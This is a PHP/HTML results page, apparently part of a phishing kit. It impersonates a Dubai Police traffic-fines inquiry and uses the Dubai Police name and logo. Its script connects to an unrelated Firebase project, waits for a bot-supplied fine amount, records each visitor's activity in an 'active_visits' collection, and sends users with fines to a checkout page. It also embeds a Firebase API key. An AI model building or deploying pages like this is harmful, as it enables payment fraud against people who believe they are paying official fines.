<?php
// صفحة عرض النتائج - متوافقة مع البوت الجديد
?>
<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>نتائج الاستعلام - شرطة دبي</title>
  <style>
    :root { --main-green: #008b47; --bg-color: #f4f7f6; }
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }

    .header-fixed {
      position: fixed; top: 0; width: 100%; z-index: 2000;
      display: flex; justify-content: center; align-items: center;
      padding: 10px 15px; background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    .logo-container img { height: 45px; }

    .container { max-width: 480px; margin: 90px auto 0; padding: 20px 15px; }
    .status-card, #resultBox {
      background: #fff; border-radius: 20px; padding: 30px;
      text-align: center; box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    .loader-ring {
      display: inline-block; width: 50px; height: 50px;
      border: 5px solid #f3f3f3; border-top: 5px solid var(--main-green);
      border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    #resultBox { display: none; border-right: 6px solid var(--main-green); text-align: right; }
    .amount-box { font-size: 35px; font-weight: 900; color: var(--main-green); margin: 10px 0; text-align: center; }
    .status-pill {
      display: inline-block;
      padding: 8px 14px;
      border-radius: 999px;
      background: #eef8f2;
      color: var(--main-green);
      font-weight: bold;
      font-size: 14px;
      margin-bottom: 16px;
    }
    .status-pill.no-fines {
      background: #eef5ff;
      color: #1e5ab6;
    }

    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; gap: 15px; }
    .info-label { color: #666; }
    .info-value { font-weight: bold; color: #333; text-align: left; }

    .details-box {
      margin-top: 16px;
      background: #f8f8f8;
      border-radius: 12px;
      padding: 14px;
      font-size: 13px;
      line-height: 1.8;
      color: #555;
      white-space: pre-wrap;
      word-break: break-word;
    }

    .pay-btn {
      width: 100%; height: 55px; background: var(--main-green); color: #fff;
      border: none; border-radius: 25px; font-size: 18px; font-weight: bold;
      margin-top: 20px; cursor: pointer;
    }

    .back-btn {
      width: 100%; height: 55px; background: #fff; color: #333;
      border: 1px solid #ddd; border-radius: 25px; font-size: 18px; font-weight: bold;
      margin-top: 12px; cursor: pointer;
    }
  </style>
</head>
<body>

<header class="header-fixed">
  <div class="logo-container"><img src="logo1.png" alt="Dubai Police"></div>
</header>

<div class="container">
  <div class="status-card" id="loadingCard">
    <div class="loader-ring"></div>
    <div style="font-weight:bold;">جاري استخراج المخالفات...</div>
    <p style="font-size:13px; color:#777;">يرجى عدم إغلاق المتصفح، يتم الآن فحص بيانات اللوحة لدى النظام.</p>
  </div>

  <div id="resultBox">
    <div id="statusPill" class="status-pill">تم العثور على نتيجة</div>
    <div style="text-align:center; color:#666; font-size:14px;">إجمالي الغرامات المستحقة</div>
    <div class="amount-box"><span id="totalAmount">0</span> <small style="font-size:15px;">AED</small></div>

    <div class="info-row">
      <span class="info-label">رقم اللوحة:</span>
      <span class="info-value" id="plateDisplay">---</span>
    </div>
    <div class="info-row">
      <span class="info-label">جهة الإصدار:</span>
      <span class="info-value" id="sourceDisplay">---</span>
    </div>
    <div class="info-row">
      <span class="info-label">رمز اللوحة:</span>
      <span class="info-value" id="codeDisplay">---</span>
    </div>
    <div class="info-row">
      <span class="info-label">حالة المخالفات:</span>
      <span class="info-value" id="fineStatusText">---</span>
    </div>

    <div class="details-box" id="detailsBox" style="display:none;"></div>

    <button class="pay-btn" id="payBtn" onclick="window.location.href='checkout.php'">متابعة الإجراء</button>
    <button class="back-btn" onclick="window.location.href='index.php'">استعلام جديد</button>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const currentOrderId = sessionStorage.getItem("last_order_id");

    if (!currentOrderId) {
      window.location.href = "index.php";
    }

    function mapSource(source) {
      const labels = {
        AbuDhabi: "أبوظبي",
        Dubai: "دبي",
        Sharjah: "الشارقة",
        Ajman: "عجمان",
        "Um Al Quwain": "أم القيوين",
        RAK: "رأس الخيمة",
        Fujairah: "الفجيرة",
        Oman: "عُمان",
        Qatar: "قطر",
        Kuwait: "الكويت",
        Bahrain: "البحرين",
        KSA: "السعودية"
      };
      return labels[source] || source || "---";
    }

    function renderResult(data) {
      document.getElementById("loadingCard").style.display = "none";
      document.getElementById("resultBox").style.display = "block";

      const amount = data.total_fines || "0";
      const resultStatus = data.result_status || (String(amount) === "0" ? "no_fines" : "has_fines");
      const plateNumber = data.plate_number || "---";
      const plateCode = data.plate_code || "---";
      const plateSource = mapSource(data.plate_source);
      const resultText = data.result_text || "";

      document.getElementById("totalAmount").innerText = amount;
      document.getElementById("plateDisplay").innerText = plateNumber;
      document.getElementById("sourceDisplay").innerText = plateSource;
      document.getElementById("codeDisplay").innerText = plateCode;

      const statusPill = document.getElementById("statusPill");
      const fineStatusText = document.getElementById("fineStatusText");
      const payBtn = document.getElementById("payBtn");
      const detailsBox = document.getElementById("detailsBox");

      if (resultStatus === "no_fines" || String(amount) === "0") {
        statusPill.innerText = "لا توجد مخالفات";
        statusPill.classList.add("no-fines");
        fineStatusText.innerText = "لا توجد غرامات مستحقة";
        payBtn.innerText = "العودة للرئيسية";
        payBtn.onclick = function () { window.location.href = 'index.php'; };
      } else {
        statusPill.innerText = "توجد مخالفات";
        fineStatusText.innerText = "غير مدفوعة";
        payBtn.innerText = "متابعة الإجراء";
        payBtn.onclick = function () { window.location.href = 'checkout.php'; };
      }

      if (resultText) {
        detailsBox.style.display = "block";
        detailsBox.innerText = resultText.slice(0, 600);
      }

      db.collection("active_visits").doc(currentOrderId).set({
        page: "مشاهدة النتائج",
        total_fines: amount,
        last_seen: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true });
    }

    db.collection("orders").doc(currentOrderId).onSnapshot((doc) => {
      if (!doc.exists) {
        window.location.href = "index.php";
        return;
      }

      const data = doc.data();
      if (data.plate_number) {
        document.getElementById("plateDisplay").innerText = data.plate_number;
      }

      if (data.status === "completed" || data.status === "success") {
        renderResult(data);
      }
    });
</script>
</body>
</html>
